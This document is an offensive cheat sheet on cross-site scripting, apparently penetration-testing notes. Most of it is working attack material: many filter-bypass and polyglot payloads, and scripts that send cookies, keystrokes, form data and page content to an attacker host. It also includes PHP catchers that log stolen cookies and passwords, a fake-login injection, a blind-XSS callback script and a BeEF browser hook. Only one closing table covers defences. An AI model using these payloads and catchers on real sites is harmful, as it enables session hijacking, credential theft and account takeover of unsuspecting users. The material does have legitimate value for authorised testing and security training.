# Cross-Site Scripting (XSS)

#XSS #CrossSiteScripting #StoredXSS #ReflectedXSS #DOMXSS #BlindXSS

## What is this?

Web app fails to sanitize user input, allowing injection of JavaScript that executes in other users' browsers. Impact ranges from cookie theft and session hijacking to full account takeover. The attack targets the **client** (victim's browser), not the server.

**Vulnerable code:** `document.innerHTML = userInput;` or server rendering `<p>Hello, <?= $name ?></p>`

---

## XSS Types

| Type | Where Payload Lives | Persistence | Severity |
|------|-------------------|-------------|----------|
| **Stored (Persistent)** | Server-side (DB, file) | Permanent until removed | Highest - hits every visitor |
| **Reflected** | URL parameter, reflected in response | Single request | Medium - requires victim to click link |
| **DOM-based** | Client-side JS (never hits server) | Single request | Medium - harder to detect server-side |
| **Blind** | Stored, but triggers in a different context (admin panel, logs) | Permanent | High - targets privileged users |

### Stored XSS

Payload saved to backend, executes when any user loads the page.

**Common locations:**
- Comment/forum fields
- User profile fields (display name, bio, about)
- File upload names
- Support tickets / feedback forms
- Chat messages

**Testing:**

```html
<!-- Drop in any user-controlled stored field -->
<script>alert(window.origin)</script>
<img src=x onerror=alert(document.cookie)>
```

### Reflected XSS

Payload in the request is echoed back in the response. Not stored.

**Common locations:**
- Search boxes (`?search=<payload>`)
- Error messages that reflect input
- URL parameters rendered on page
- Form inputs reflected in confirmation pages

**Testing:**

```bash
# Check if input is reflected in the response
curl -s "http://target.com/search?q=UNIQUE_STRING" | grep "UNIQUE_STRING"

# If reflected without encoding, try payload
http://target.com/search?q=<script>alert(1)</script>
```

### DOM-based XSS

Payload processed entirely in the browser via JavaScript. Never sent to server.

**Sources (where attacker input enters):**
- `location.hash` (`#fragment`)
- `location.search` (`?param=value`)
- `location.href`
- `document.referrer`
- `window.name`
- `postMessage` data

**Sinks (where input gets executed):**
- `innerHTML` / `outerHTML`
- `document.write()` / `document.writeln()`
- `eval()` / `Function()`
- `setTimeout()` / `setInterval()` (with string args)
- `element.setAttribute()` (on event handlers)
- jQuery: `$()`, `.html()`, `.append()`

**Testing:**

```javascript
// Check URL fragment handling
http://target.com/page#<img src=x onerror=alert(1)>

// Check URL params used client-side
http://target.com/page?default=<script>alert(1)</script>

// Use browser DevTools console to trace
// Sources > Event Listener Breakpoints > Script > Script First Statement
```

### Blind XSS

Payload executes in a context you can't see (admin panel, log viewer, ticketing system).

**Testing:**

```html
<!-- Load external script that phones home when triggered -->
<script src="http://ATTACKER_IP/xss.js"></script>
'"><script src="http://ATTACKER_IP/xss.js"></script>
"><img src=x onerror="fetch('http://ATTACKER_IP/?c='+document.cookie)">
```

**Callback server setup:**

```bash
# Simple listener
sudo python3 -m http.server 80

# Or use netcat
sudo nc -lvnp 80
```

**Common blind XSS targets:**
- Contact/support forms (admin reads them)
- User-Agent or Referer headers (logged and viewed)
- Order/checkout notes
- Error reporting systems
- Log aggregation dashboards

---

## XSS Discovery

### Manual Testing Approach

1. **Map input points** - every form field, URL parameter, header, cookie value
2. **Check reflection** - submit a unique string (`er2test123`), search response for it
3. **Identify context** - where does your input land? (HTML body, attribute, JS block, URL)
4. **Test for encoding** - submit `<>"'&` and check if they're encoded in the response
5. **Craft context-specific payload** - see injection contexts below
6. **Try filter bypasses** if basic payloads are blocked

### Injection Contexts

**Inside HTML body:**

```html
<!-- Input lands between tags -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

**Inside an HTML attribute:**

```html
<!-- Input lands in an attribute value -->
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
"><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```

**Inside JavaScript block:**

```javascript
// Input lands inside a JS string
';alert(1);//
'-alert(1)-'
\'-alert(1)//
</script><script>alert(1)</script>
```

**Inside URL/href attribute:**

```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Fuzz for XSS Parameters

```bash
# Find reflective parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://target.com/?FUZZ=xss_test' \
     -fs 0 -mc 200

# Fuzz with payloads against known parameter
ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt:FUZZ \
     -u 'http://target.com/?search=FUZZ' \
     -fs 0
```

---

## Filter Bypasses

### Tag Blacklist Bypasses

When `<script>` is blocked:

```html
<!-- Event handlers on other tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<math><mtext><table><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(1) src=1>">
```

### Non-Recursive Filter Bypass

Filter strips `<script>` once:

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<scrscriptipt>alert(1)</scrscriptipt>
```

### Case Manipulation

```html
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>
```

### Encoding Bypasses

```html
<!-- URL encoding -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- HTML entities -->
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
<img src=x onerror="&#x61;lert(1)">

<!-- Unicode -->
<script>\u0061lert(1)</script>

<!-- Double encoding -->
%253Cscript%253Ealert(1)%253C/script%253E

<!-- Mixed -->
<img src=x onerror="\u0061\u006C\u0065\u0072\u0074(1)">
```

### Quote/Parentheses Bypasses

```html
<!-- No quotes needed -->
<img src=x onerror=alert(1)>

<!-- Backticks instead of parentheses -->
<svg onload=alert`1`>
<img src=x onerror=confirm`1`>

<!-- No parentheses (throw + onerror) -->
<script>onerror=alert;throw 1</script>

<!-- Template literals -->
<script>alert`document.cookie`</script>
```

### Space Bypasses

```html
<!-- Use / instead of space -->
<img/src=x/onerror=alert(1)>
<svg/onload=alert(1)>

<!-- Tab or newline -->
<img%09src=x%09onerror=alert(1)>
<img%0asrc=x%0aonerror=alert(1)>
```

### JavaScript Protocol

```html
<a href="javascript:alert(1)">click</a>
<a href="JaVaScRiPt:alert(1)">click</a>
<iframe src="javascript:alert(1)">
<form action="javascript:alert(1)"><button>submit</button></form>
```

### Polyglot Payloads

One payload that works in multiple contexts:

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Simpler polyglots -->
"><script>alert(1)</script>
"><svg/onload=confirm`XSS`>
"><img src=x onerror=prompt(1)>
'"><img src=x onerror=alert(1)>
```

### Bypassing HttpOnly Cookies

When cookies have `HttpOnly` flag (can't access via `document.cookie`):

```javascript
// Can't steal cookies directly, but can still:
// 1. Perform actions AS the user (CSRF-style via XSS)
fetch('/api/admin/users', {credentials: 'include'})
  .then(r => r.text())
  .then(d => fetch('http://ATTACKER_IP/?data=' + btoa(d)));

// 2. Capture keystrokes
document.onkeypress = function(e) {
  fetch('http://ATTACKER_IP/?key=' + e.key);
};

// 3. Screenshot via html2canvas (if loaded) or read DOM
fetch('http://ATTACKER_IP/?html=' + btoa(document.body.innerHTML));
```

---

## XSS Exploitation

### Cookie Stealing

**Basic payload:**

```javascript
// Redirect (visible to user)
document.location='http://ATTACKER_IP/steal?c='+document.cookie;

// Image beacon (invisible)
new Image().src='http://ATTACKER_IP/steal?c='+document.cookie;

// Fetch (invisible, modern)
fetch('http://ATTACKER_IP/steal?c='+document.cookie);
```

**PHP cookie catcher (`index.php`):**

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

```bash
# Start catcher
sudo php -S 0.0.0.0:80
```

### Session Hijacking

After stealing cookie, replay it:

```bash
# Use stolen cookie to access the app as victim
curl -b 'PHPSESSID=stolen_session_id' http://target.com/dashboard

# Or set in browser DevTools:
# Application > Cookies > Edit PHPSESSID value
# Or use Cookie-Editor extension
```

### Phishing via XSS (Login Stealing)

**Inject fake login form that posts creds to attacker:**

```javascript
document.write('<h3>Please login to continue</h3><form action=http://ATTACKER_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
document.getElementById('urlform').remove();
```

**PHP credential catcher (`index.php`):**

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://target.com/login");
    fclose($file);
    exit();
}
?>
```

### Defacing

Change page appearance to demonstrate impact:

```javascript
// Background
document.body.style.background = "#141d2b";
document.body.background = "http://ATTACKER_IP/background.jpg";

// Title
document.title = 'Page Defaced';

// Replace page content
document.getElementsByTagName('body')[0].innerHTML = '<center><h1>Defaced</h1></center>';

// Modify specific elements
document.getElementById("target").innerHTML = "Modified Content";
```

### Keylogging

```javascript
// Capture all keystrokes
document.onkeypress = function(e) {
  new Image().src = 'http://ATTACKER_IP/log?key=' + e.key;
};

// Capture form submissions
document.querySelectorAll('form').forEach(f => {
  f.addEventListener('submit', function() {
    var data = new FormData(f);
    var params = new URLSearchParams(data).toString();
    new Image().src = 'http://ATTACKER_IP/log?' + params;
  });
});
```

---

## Blind XSS Testing

### Payload Delivery

Inject into fields you suspect are viewed by admins/staff:

```html
<!-- Script tag with callback -->
<script src="http://ATTACKER_IP/xss.js"></script>

<!-- Multiple contexts -->
'"><script src="http://ATTACKER_IP/xss.js"></script>
"><img src=x onerror="var s=document.createElement('script');s.src='http://ATTACKER_IP/xss.js';document.body.appendChild(s);">

<!-- For fields that might strip script tags -->
<img src=x onerror="fetch('http://ATTACKER_IP/?cookie='+document.cookie+'&url='+document.URL)">
```

### Blind XSS Callback Script (`xss.js`)

```javascript
// Grab everything useful and send it back
var data = 'cookie=' + document.cookie +
           '&url=' + document.URL +
           '&dom=' + btoa(document.body.innerHTML);
new Image().src = 'http://ATTACKER_IP/callback?' + data;
```

### Tools for Blind XSS

- **XSS Hunter** - Hosted service, auto-captures screenshots + cookies + DOM when payload fires
- Self-hosted alternatives work too (just host your own callback JS + listener)

---

## DOM XSS Deep Dive

### Finding DOM XSS

**Grep for dangerous sinks in JS files:**

```bash
# Download and search JS files
curl -s http://target.com/app.js | grep -iE '(innerHTML|outerHTML|document\.write|eval\(|setTimeout|setInterval|\.html\(|\.append\()'

# Or in browser DevTools:
# Sources > Search across all files (Ctrl+Shift+F)
# Search for: innerHTML, document.write, eval, .html(
```

**Trace source to sink:**

1. Find user-controllable input (URL params, hash, referrer)
2. Follow the data through JS code
3. See if it reaches a dangerous sink without sanitization

### DOM XSS via jQuery

```javascript
// Vulnerable pattern - user input to jQuery selector
var hash = location.hash.slice(1);
$(hash);  // If hash is <img src=x onerror=alert(1)>, executes

// Vulnerable .html() usage
$('#output').html(userInput);

// Vulnerable $.getJSON callback
$.getJSON('/api?callback=' + userInput);
```

### DOM Invader (Burp)

Built into Burp's embedded browser. Automatically:
- Identifies sources and sinks
- Tests for DOM XSS
- Traces data flow through JavaScript
- Canary-based detection

---

## CSP (Content Security Policy) Considerations

### Checking CSP

```bash
# Check response headers
curl -sI http://target.com | grep -i content-security-policy

# Common CSP that blocks inline scripts
Content-Security-Policy: default-src 'self'; script-src 'self'
```

### CSP Bypass Techniques

```html
<!-- If 'unsafe-inline' is set, inline scripts work -->
<script>alert(1)</script>

<!-- If a CDN is whitelisted, load from there -->
<script src="https://allowed-cdn.com/angular.js"></script>
<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>

<!-- JSONP endpoints on whitelisted domains -->
<script src="https://allowed-domain.com/jsonp?callback=alert(1)//"></script>

<!-- base tag hijack (if base-uri not restricted) -->
<base href="http://ATTACKER_IP/">
<script src="/xss.js"></script>

<!-- If 'nonce' is used but predictable or leaked -->
<script nonce="leaked_nonce">alert(1)</script>
```

### When CSP Blocks Everything

Even with strict CSP, XSS can still:
- Redirect: `document.location = 'http://ATTACKER_IP/?cookie=' + document.cookie`
- Exfiltrate via CSS injection (if style-src is permissive)
- Abuse dangling markup injection

---

## BeEF (Browser Exploitation Framework)

Hook a victim's browser via XSS, then run modules from the BeEF UI.

```bash
# Start BeEF (Kali)
cd /usr/share/beef-xss
./beef

# Default UI: http://127.0.0.1:3000/ui/panel
# Default creds: beef:beef
```

**Hook payload — inject via XSS:**

```html
<script src="http://<AttackerIP>:3000/hook.js"></script>
```

**Useful BeEF modules post-hook:**

| Module | Path in BeEF UI |
|--------|----------------|
| Get cookies | Browser > Hooked Domain > Get Cookie |
| Steal form creds | Network > Detect > various |
| Keylogger | Browser > Hooked Domain > Interceptor |
| Redirect browser | Browser > Hooked Domain > Redirect Browser |
| Network scan | Network > Port Scanner |
| Webcam snap | Browser > Webcam |
| Fake login prompt | Social Engineering > Pretty Theft |

---

## SVG / HTML File Upload XSS

When a site accepts image uploads and serves SVG files directly, the browser renders them as HTML.

```xml
<!-- shell.svg -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)"/>
```

```xml
<!-- More powerful — load external script -->
<svg xmlns="http://www.w3.org/2000/svg" onload="var s=document.createElement('script');s.src='http://<AttackerIP>/xss.js';document.body.appendChild(s)"/>
```

```html
<!-- HTML file upload (if .html allowed) -->
<script>document.location='http://<AttackerIP>/steal?c='+document.cookie</script>
```

- Upload the file, navigate directly to its URL → XSS fires in victim's browser when they view it
- Combine with Stored XSS if the filename or link is rendered on another page

---

## Commonly Missed Injection Points

- `innerHTML` assignments in JS
- `document.write()` with user input
- `location.hash` / `location.search` parsed client-side
- `setTimeout()` / `setInterval()` with string arguments
- `<iframe src="javascript:...">`
- Event handlers: `onload`, `onmouseover`, `onfocus`, `onerror`, `onhashchange`
- JSONP endpoints with `callback` parameters
- `postMessage` handlers without origin checking
- Third-party widgets/analytics scripts
- HTTP headers reflected in page (User-Agent, Referer)
- File upload names displayed on page
- Error pages that reflect the URL path

---

## Automated Scanning

### Parameter Discovery

```bash
# Fuzz for reflective parameters
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u 'http://target.com/?FUZZ=xss_test_string' \
     -fs 0 -mc 200
```

### Payload Fuzzing

```bash
# Fuzz with XSS payloads
ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-BruteLogic.txt:FUZZ \
     -u 'http://target.com/?search=FUZZ' \
     -fs 0

# Alternative wordlists
/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt
/usr/share/seclists/Fuzzing/XSS/XSS-RSNAKE.txt
```

### Tools

- [[Burp Suite]] - Manual testing, Repeater, Scanner, DOM Invader
- [XSStrike](https://github.com/s0md3v/XSStrike) - Context-aware fuzzer with payload evaluation
- [DalFox](https://github.com/hahwul/dalfox) - Fast scanner, blind XSS support
- [XSS Hunter](https://xsshunter.trufflesecurity.com/) - Blind XSS tracking with screenshots
- [BruteXSS](https://github.com/rajeshmajumdar/BruteXSS) - Brute force XSS scanner
- [XSSer](https://github.com/epsylon/xsser) - Automated XSS framework
- DOM Invader (PortSwigger) - DOM XSS in Burp's browser
- [BeEF](https://github.com/beefproject/beef) - Browser Exploitation Framework — hook browsers, run post-XSS modules

**Wordlists:**
- [XSS-BruteLogic.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/XSS-BruteLogic.txt)
- [XSS-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XSS/XSS-Jhaddix.txt)
- [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

## Troubleshooting

### Payload Not Firing?

**Check the context:**
- View page source (not just inspect element) - is your input encoded?
- Is input inside an attribute? JS block? HTML comment? Different context = different payload
- Check if the app uses a framework (React auto-escapes, Angular has sandbox)

**Getting filtered:**
- Try different tags (`svg`, `img`, `details`, `math`)
- Try different event handlers (`onerror`, `onload`, `onfocus`, `ontoggle`)
- Encode portions of the payload (URL, HTML entities, Unicode)
- Use capitalization tricks (`<ScRiPt>`)
- Try without quotes or parentheses (backticks, `throw`)

**CSP blocking execution:**
- Check `Content-Security-Policy` header
- Look for `unsafe-inline`, `unsafe-eval` (easy wins)
- Check for whitelisted CDNs with JSONP endpoints
- Try redirection-based exfiltration if inline is blocked

**DOM XSS not triggering:**
- Check browser console for JS errors
- Make sure your payload reaches the sink (set breakpoints)
- Some sinks need interaction (mouseover, focus, click)
- Try different sources (hash vs search vs referrer)

**Blind XSS not calling back:**
- Firewall blocking outbound connections?
- Try different ports (80, 443, 8080, 53)
- Payload might be stored but not yet viewed
- Try multiple payload formats (script tag, img onerror, fetch)

---

## Attack Chains

1. XSS → Cookie Theft → Session Hijacking → Account Takeover
2. XSS → Phishing (fake login) → Credential Theft
3. XSS → Keylogging → Credential Capture
4. Stored XSS → Admin Panel → Privilege Escalation
5. XSS → CSRF Bypass → Unauthorized Actions (password change, role change)
6. Blind XSS → Admin Session → Internal Access
7. XSS → SSRF (via fetch/XMLHttpRequest) → Internal Network Access
8. DOM XSS → Client-Side Logic Bypass → Data Exfiltration

---

## Prevention (Know the Defenses)

Understanding defenses helps you spot gaps:

| Defense | What It Does | Bypass Potential |
|---------|-------------|-----------------|
| **HTML Entity Encoding** | Converts `<>"'&` to entities | Doesn't help in JS context |
| **Input Validation** | Whitelist allowed chars | Bypass with allowed chars in payloads |
| **CSP** | Restricts script sources | Misconfigured CSPs are common |
| **HttpOnly Cookies** | Blocks JS cookie access | Can still perform actions as user |
| **X-XSS-Protection** | Legacy browser filter | Deprecated, unreliable |
| **WAF** | Pattern-based blocking | Encoding, obfuscation, polyglots |
| **Sanitization Libraries** | DOMPurify, Bleach, etc. | Usually solid, look for older versions |

---

## Related Topics

**Modules:**
- [[File Upload Attacks]] - Upload HTML/SVG with XSS payloads
- [[Web Attacks]] - CSRF, other injection types
- [[Session Security]] - Session hijacking post-XSS
- [[SQL Injection]] - Sometimes chainable with XSS

**Tools:**
- [[Burp Suite]] - Manual testing
- [[ffuf]] - Fuzzing
- [[gobuster]] - Enumeration

**External:**
- [HackTricks - XSS](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger - XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP - XSS Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Scripting_Prevention_Cheat_Sheet.html)

